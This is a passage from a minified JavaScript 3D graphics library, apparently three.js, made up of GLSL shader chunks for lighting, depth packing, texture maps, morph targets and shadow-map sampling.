BlinnExponentToGGXRoughness( material.specularShininess );\\n\\t\\tvec3 spec = Rect_Area_Light_Specular_Reflectance(\\n\\t\\t\\t\\tgeometry,\\n\\t\\t\\t\\trectAreaLight.position, rectAreaLight.halfWidth, rectAreaLight.halfHeight,\\n\\t\\t\\t\\troughness,\\n\\t\\t\\t\\tltcMat, ltcMag );\\n\\t\\tvec3 diff = Rect_Area_Light_Diffuse_Reflectance(\\n\\t\\t\\t\\tgeometry,\\n\\t\\t\\t\\trectAreaLight.position, rectAreaLight.halfWidth, rectAreaLight.halfHeight );\\n\\t\\treflectedLight.directSpecular += lightColor * matSpecColor * spec / PI2;\\n\\t\\treflectedLight.directDiffuse  += lightColor * matDiffColor * diff / PI2;\\n\\t}\\n#endif\\nvoid RE_Direct_BlinnPhong( const in IncidentLight directLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\t#ifdef TOON\\n\\t\\tvec3 irradiance = getGradientIrradiance( geometry.normal, directLight.direction ) * directLight.color;\\n\\t#else\\n\\t\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\t\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#endif\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\treflectedLight.directSpecular += irradiance * BRDF_Specular_BlinnPhong( directLight, geometry, material.specularColor, material.specularShininess ) * material.specularStrength;\\n}\\nvoid RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\n#define RE_Direct\\t\\t\\t\\tRE_Direct_BlinnPhong\\n#define RE_Direct_RectArea\\t\\tRE_Direct_RectArea_BlinnPhong\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_BlinnPhong\\n#define Material_LightProbeLOD( material )\\t(0)\\n\",\nlights_physical_fragment:\"PhysicalMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );\\nmaterial.specularRoughness = clamp( roughnessFactor, 0.04, 1.0 );\\n#ifdef STANDARD\\n\\tmaterial.specularColor = mix( vec3( DEFAULT_SPECULAR_COEFFICIENT ), diffuseColor.rgb, metalnessFactor );\\n#else\\n\\tmaterial.specularColor = mix( vec3( MAXIMUM_SPECULAR_COEFFICIENT * pow2( reflectivity ) ), diffuseColor.rgb, metalnessFactor );\\n\\tmaterial.clearCoat = saturate( clearCoat );\\tmaterial.clearCoatRoughness = clamp( clearCoatRoughness, 0.04, 1.0 );\\n#endif\\n\",\nlights_physical_pars_fragment:\"struct PhysicalMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tfloat\\tspecularRoughness;\\n\\tvec3\\tspecularColor;\\n\\t#ifndef STANDARD\\n\\t\\tfloat clearCoat;\\n\\t\\tfloat clearCoatRoughness;\\n\\t#endif\\n};\\n#define MAXIMUM_SPECULAR_COEFFICIENT 0.16\\n#define DEFAULT_SPECULAR_COEFFICIENT 0.04\\nfloat clearCoatDHRApprox( const in float roughness, const in float dotNL ) {\\n\\treturn DEFAULT_SPECULAR_COEFFICIENT + ( 1.0 - DEFAULT_SPECULAR_COEFFICIENT ) * ( pow( 1.0 - dotNL, 5.0 ) * pow( 1.0 - roughness, 2.0 ) );\\n}\\n#if NUM_RECT_AREA_LIGHTS > 0\\n\\tvoid RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\t\\tvec3 matDiffColor = material.diffuseColor;\\n\\t\\tvec3 matSpecColor = material.specularColor;\\n\\t\\tvec3 lightColor   = rectAreaLight.color;\\n\\t\\tfloat roughness = material.specularRoughness;\\n\\t\\tvec3 spec = Rect_Area_Light_Specular_Reflectance(\\n\\t\\t\\t\\tgeometry,\\n\\t\\t\\t\\trectAreaLight.position, rectAreaLight.halfWidth, rectAreaLight.halfHeight,\\n\\t\\t\\t\\troughness,\\n\\t\\t\\t\\tltcMat, ltcMag );\\n\\t\\tvec3 diff = Rect_Area_Light_Diffuse_Reflectance(\\n\\t\\t\\t\\tgeometry,\\n\\t\\t\\t\\trectAreaLight.position, rectAreaLight.halfWidth, rectAreaLight.halfHeight );\\n\\t\\treflectedLight.directSpecular += lightColor * matSpecColor * spec;\\n\\t\\treflectedLight.directDiffuse  += lightColor * matDiffColor * diff;\\n\\t}\\n#endif\\nvoid RE_Direct_Physical( const in IncidentLight directLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\t#ifndef STANDARD\\n\\t\\tfloat clearCoatDHR = material.clearCoat * clearCoatDHRApprox( material.clearCoatRoughness, dotNL );\\n\\t#else\\n\\t\\tfloat clearCoatDHR = 0.0;\\n\\t#endif\\n\\treflectedLight.directSpecular += ( 1.0 - clearCoatDHR ) * irradiance * BRDF_Specular_GGX( directLight, geometry, material.specularColor, material.specularRoughness );\\n\\treflectedLight.directDiffuse += ( 1.0 - clearCoatDHR ) * irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.directSpecular += irradiance * material.clearCoat * BRDF_Specular_GGX( directLight, geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\nvoid RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\nvoid RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 clearCoatRadiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\t#ifndef STANDARD\\n\\t\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\t\\tfloat dotNL = dotNV;\\n\\t\\tfloat clearCoatDHR = material.clearCoat * clearCoatDHRApprox( material.clearCoatRoughness, dotNL );\\n\\t#else\\n\\t\\tfloat clearCoatDHR = 0.0;\\n\\t#endif\\n\\treflectedLight.indirectSpecular += ( 1.0 - clearCoatDHR ) * radiance * BRDF_Specular_GGX_Environment( geometry, material.specularColor, material.specularRoughness );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.indirectSpecular += clearCoatRadiance * material.clearCoat * BRDF_Specular_GGX_Environment( geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\n#define RE_Direct\\t\\t\\t\\tRE_Direct_Physical\\n#define RE_Direct_RectArea\\t\\tRE_Direct_RectArea_Physical\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_Physical\\n#define RE_IndirectSpecular\\t\\tRE_IndirectSpecular_Physical\\n#define Material_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.specularRoughness )\\n#define Material_ClearCoat_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.clearCoatRoughness )\\nfloat computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {\\n\\treturn saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );\\n}\\n\",\nlights_template:\"\\nGeometricContext geometry;\\ngeometry.position = - vViewPosition;\\ngeometry.normal = normal;\\ngeometry.viewDir = normalize( vViewPosition );\\nIncidentLight directLight;\\n#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tPointLight pointLight;\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tgetPointDirectLightIrradiance( pointLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( pointLight.shadow, directLight.visible ) ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tSpotLight spotLight;\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tgetSpotDirectLightIrradiance( spotLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( spotLight.shadow, directLight.visible ) ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tDirectionalLight directionalLight;\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( directionalLight.shadow, directLight.visible ) ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )\\n\\tRectAreaLight rectAreaLight;\\n\\tfor ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {\\n\\t\\trectAreaLight = rectAreaLights[ i ];\\n\\t\\tRE_Direct_RectArea( rectAreaLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if defined( RE_IndirectDiffuse )\\n\\tvec3 irradiance = getAmbientLightIrradiance( ambientLightColor );\\n\\t#ifdef USE_LIGHTMAP\\n\\t\\tvec3 lightMapIrradiance = texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tlightMapIrradiance *= PI;\\n\\t\\t#endif\\n\\t\\tirradiance += lightMapIrradiance;\\n\\t#endif\\n\\t#if ( NUM_HEMI_LIGHTS > 0 )\\n\\t\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\t\\tirradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t}\\n\\t#endif\\n\\t#if defined( USE_ENVMAP ) && defined( PHYSICAL ) && defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\tirradiance += getLightProbeIndirectIrradiance( geometry, 8 );\\n\\t#endif\\n\\tRE_IndirectDiffuse( irradiance, geometry, material, reflectedLight );\\n#endif\\n#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )\\n\\tvec3 radiance = getLightProbeIndirectRadiance( geometry, Material_BlinnShininessExponent( material ), 8 );\\n\\t#ifndef STANDARD\\n\\t\\tvec3 clearCoatRadiance = getLightProbeIndirectRadiance( geometry, Material_ClearCoat_BlinnShininessExponent( material ), 8 );\\n\\t#else\\n\\t\\tvec3 clearCoatRadiance = vec3( 0.0 );\\n\\t#endif\\n\\tRE_IndirectSpecular( radiance, clearCoatRadiance, geometry, material, reflectedLight );\\n#endif\\n\",\nlogdepthbuf_fragment:\"#if defined(USE_LOGDEPTHBUF) && defined(USE_LOGDEPTHBUF_EXT)\\n\\tgl_FragDepthEXT = log2(vFragDepth) * logDepthBufFC * 0.5;\\n#endif\",logdepthbuf_pars_fragment:\"#ifdef USE_LOGDEPTHBUF\\n\\tuniform float logDepthBufFC;\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n#endif\\n\",logdepthbuf_pars_vertex:\"#ifdef USE_LOGDEPTHBUF\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n\\tuniform float logDepthBufFC;\\n#endif\",logdepthbuf_vertex:\"#ifdef USE_LOGDEPTHBUF\\n\\tgl_Position.z = log2(max( EPSILON, gl_Position.w + 1.0 )) * logDepthBufFC;\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvFragDepth = 1.0 + gl_Position.w;\\n\\t#else\\n\\t\\tgl_Position.z = (gl_Position.z - 1.0) * gl_Position.w;\\n\\t#endif\\n#endif\\n\",\nmap_fragment:\"#ifdef USE_MAP\\n\\tvec4 texelColor = texture2D( map, vUv );\\n\\ttexelColor = mapTexelToLinear( texelColor );\\n\\tdiffuseColor *= texelColor;\\n#endif\\n\",map_pars_fragment:\"#ifdef USE_MAP\\n\\tuniform sampler2D map;\\n#endif\\n\",map_particle_fragment:\"#ifdef USE_MAP\\n\\tvec4 mapTexel = texture2D( map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y ) * offsetRepeat.zw + offsetRepeat.xy );\\n\\tdiffuseColor *= mapTexelToLinear( mapTexel );\\n#endif\\n\",map_particle_pars_fragment:\"#ifdef USE_MAP\\n\\tuniform vec4 offsetRepeat;\\n\\tuniform sampler2D map;\\n#endif\\n\",\nmetalnessmap_fragment:\"float metalnessFactor = metalness;\\n#ifdef USE_METALNESSMAP\\n\\tvec4 texelMetalness = texture2D( metalnessMap, vUv );\\n\\tmetalnessFactor *= texelMetalness.r;\\n#endif\\n\",metalnessmap_pars_fragment:\"#ifdef USE_METALNESSMAP\\n\\tuniform sampler2D metalnessMap;\\n#endif\",morphnormal_vertex:\"#ifdef USE_MORPHNORMALS\\n\\tobjectNormal += ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];\\n\\tobjectNormal += ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];\\n\\tobjectNormal += ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];\\n\\tobjectNormal += ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];\\n#endif\\n\",\nmorphtarget_pars_vertex:\"#ifdef USE_MORPHTARGETS\\n\\t#ifndef USE_MORPHNORMALS\\n\\tuniform float morphTargetInfluences[ 8 ];\\n\\t#else\\n\\tuniform float morphTargetInfluences[ 4 ];\\n\\t#endif\\n#endif\",morphtarget_vertex:\"#ifdef USE_MORPHTARGETS\\n\\ttransformed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];\\n\\ttransformed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];\\n\\ttransformed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];\\n\\ttransformed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];\\n\\t#ifndef USE_MORPHNORMALS\\n\\ttransformed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];\\n\\ttransformed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];\\n\\ttransformed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];\\n\\ttransformed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];\\n\\t#endif\\n#endif\\n\",\nnormal_flip:\"#ifdef DOUBLE_SIDED\\n\\tfloat flipNormal = ( float( gl_FrontFacing ) * 2.0 - 1.0 );\\n#else\\n\\tfloat flipNormal = 1.0;\\n#endif\\n\",normal_fragment:\"#ifdef FLAT_SHADED\\n\\tvec3 fdx = vec3( dFdx( vViewPosition.x ), dFdx( vViewPosition.y ), dFdx( vViewPosition.z ) );\\n\\tvec3 fdy = vec3( dFdy( vViewPosition.x ), dFdy( vViewPosition.y ), dFdy( vViewPosition.z ) );\\n\\tvec3 normal = normalize( cross( fdx, fdy ) );\\n#else\\n\\tvec3 normal = normalize( vNormal ) * flipNormal;\\n#endif\\n#ifdef USE_NORMALMAP\\n\\tnormal = perturbNormal2Arb( -vViewPosition, normal );\\n#elif defined( USE_BUMPMAP )\\n\\tnormal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );\\n#endif\\n\",\nnormalmap_pars_fragment:\"#ifdef USE_NORMALMAP\\n\\tuniform sampler2D normalMap;\\n\\tuniform vec2 normalScale;\\n\\tvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm ) {\\n\\t\\tvec3 q0 = dFdx( eye_pos.xyz );\\n\\t\\tvec3 q1 = dFdy( eye_pos.xyz );\\n\\t\\tvec2 st0 = dFdx( vUv.st );\\n\\t\\tvec2 st1 = dFdy( vUv.st );\\n\\t\\tvec3 S = normalize( q0 * st1.t - q1 * st0.t );\\n\\t\\tvec3 T = normalize( -q0 * st1.s + q1 * st0.s );\\n\\t\\tvec3 N = normalize( surf_norm );\\n\\t\\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\\n\\t\\tmapN.xy = normalScale * mapN.xy;\\n\\t\\tmat3 tsn = mat3( S, T, N );\\n\\t\\treturn normalize( tsn * mapN );\\n\\t}\\n#endif\\n\",\npacking:\"vec3 packNormalToRGB( const in vec3 normal ) {\\n\\treturn normalize( normal ) * 0.5 + 0.5;\\n}\\nvec3 unpackRGBToNormal( const in vec3 rgb ) {\\n\\treturn 1.0 - 2.0 * rgb.xyz;\\n}\\nconst float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;\\nconst vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256.,  256. );\\nconst vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );\\nconst float ShiftRight8 = 1. / 256.;\\nvec4 packDepthToRGBA( const in float v ) {\\n\\tvec4 r = vec4( fract( v * PackFactors ), v );\\n\\tr.yzw -= r.xyz * ShiftRight8;\\treturn r * PackUpscale;\\n}\\nfloat unpackRGBAToDepth( const in vec4 v ) {\\n\\treturn dot( v, UnpackFactors );\\n}\\nfloat viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {\\n\\treturn ( viewZ + near ) / ( near - far );\\n}\\nfloat orthographicDepthToViewZ( const in float linearClipZ, const in float near, const in float far ) {\\n\\treturn linearClipZ * ( near - far ) - near;\\n}\\nfloat viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {\\n\\treturn (( near + viewZ ) * far ) / (( far - near ) * viewZ );\\n}\\nfloat perspectiveDepthToViewZ( const in float invClipZ, const in float near, const in float far ) {\\n\\treturn ( near * far ) / ( ( far - near ) * invClipZ - far );\\n}\\n\",\npremultiplied_alpha_fragment:\"#ifdef PREMULTIPLIED_ALPHA\\n\\tgl_FragColor.rgb *= gl_FragColor.a;\\n#endif\\n\",project_vertex:\"#ifdef USE_SKINNING\\n\\tvec4 mvPosition = modelViewMatrix * skinned;\\n#else\\n\\tvec4 mvPosition = modelViewMatrix * vec4( transformed, 1.0 );\\n#endif\\ngl_Position = projectionMatrix * mvPosition;\\n\",roughnessmap_fragment:\"float roughnessFactor = roughness;\\n#ifdef USE_ROUGHNESSMAP\\n\\tvec4 texelRoughness = texture2D( roughnessMap, vUv );\\n\\troughnessFactor *= texelRoughness.r;\\n#endif\\n\",\nroughnessmap_pars_fragment:\"#ifdef USE_ROUGHNESSMAP\\n\\tuniform sampler2D roughnessMap;\\n#endif\",shadowmap_pars_fragment:\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform sampler2D directionalShadowMap[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform sampler2D spotShadowMap[ NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform sampler2D pointShadowMap[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n\\tfloat texture2DCompare( sampler2D depths, vec2 uv, float compare ) {\\n\\t\\treturn step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );\\n\\t}\\n\\tfloat texture2DShadowLerp( sampler2D depths, vec2 size, vec2 uv, float compare ) {\\n\\t\\tconst vec2 offset = vec2( 0.0, 1.0 );\\n\\t\\tvec2 texelSize = vec2( 1.0 ) / size;\\n\\t\\tvec2 centroidUV = floor( uv * size + 0.5 ) / size;\\n\\t\\tfloat lb = texture2DCompare( depths, centroidUV + texelSize * offset.xx, compare );\\n\\t\\tfloat lt = texture2DCompare( depths, centroidUV + texelSize * offset.xy, compare );\\n\\t\\tfloat rb = texture2DCompare( depths, centroidUV + texelSize * offset.yx, compare );\\n\\t\\tfloat rt = texture2DCompare( depths, centroidUV + texelSize * offset.yy, compare );\\n\\t\\tvec2 f = fract( uv * size + 0.5 );\\n\\t\\tfloat a = mix( lb, lt, f.y );\\n\\t\\tfloat b = mix( rb, rt, f.y );\\n\\t\\tfloat c = mix( a, b, f.x );\\n\\t\\treturn c;\\n\\t}\\n\\tfloat getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\\n\\t\\tshadowCoord.xyz /= shadowCoord.w;\\n\\t\\tshadowCoord.z += shadowBias;\\n\\t\\tbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );\\n\\t\\tbool inFrustum = all( inFrustumVec );\\n\\t\\tbvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\\n\\t\\tbool frustumTest = all( frustumTestVec );\\n\\t\\tif ( frustumTest ) {\\n\\t\\t#if defined( SHADOWMAP_TYPE_PCF )\\n\\t\\t\\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\\n\\t\\t\\tfloat dx0 = - texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy0 = - texelSize.y * shadowRadius;\\n\\t\\t\\tfloat dx1 = + texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy1 = + texelSize.y * shadowRadius;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\\n\\t\\t\\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\\n\\t\\t\\tfloat dx0 = - texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy0 = - texelSize.y * shadowRadius;\\n\\t\\t\\tfloat dx1 = + texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy1 = + texelSize.y * shadowRadius;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy, shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#else\\n\\t\\t\\treturn texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );\\n\\t\\t#endif\\n\\t\\t}\\n\\t\\treturn 1.0;\\n\\t}\\n\\tvec2 cubeToUV( vec3 v, float texelSizeY ) {\\n\\t\\tvec3 absV = abs( v );\\n\\t\\tfloat scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );\\n\\t\\tabsV *= scaleToCube;\\n\\t\\tv *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );\\n\\t\\tvec2 planar = v.xy;\\n\\t\\tfloat almostATexel = 1.5 * texelSizeY;\\n\\t\\tfloat almostOne = 1.0 - almostATexel;\\n\\t\\tif ( absV.z >= almostOne ) {\\n\\t\\t\\tif ( v.z > 0.0 )\\n\\t\\t\\t\\tplanar.x = 4.0 - v.x;\\n\\t\\t} else if ( absV.x >= almostOne ) {\\n\\t\\t\\tfloat signX = sign( v.x );\\n\\t\\t\\tplanar.x = v.z * signX + 2.0 * signX;\\n\\t\\t} else if ( absV.y >= almostOne ) {\\n\\t\\t\\tfloat signY = sign( v.y );\\n\\t\\t\\tplanar.x = v.x + 2.0 * signY + 2.0;\\n\\t\\t\\tplanar.y = v.z * signY - 2.0;\\n\\t\\t}\\n\\t\\treturn vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );\\n\\t}\\n\\tfloat getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\\n\\t\\tvec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );\\n\\t\\tvec3 lightToPosition = shadowCoord.xyz;\\n\\t\\tvec3 bd3D = normalize( lightToPosition );\\n\\t\\tfloat dp = ( length( lightToPosition ) - shadowBias ) / 1000.0;\\n\\t\\t#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT )\\n\\t\\t\\tvec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#else\\n\\t\\t\\treturn texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\",\nshadowmap_pars_vertex:\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform mat4 spotShadowMatrix[ 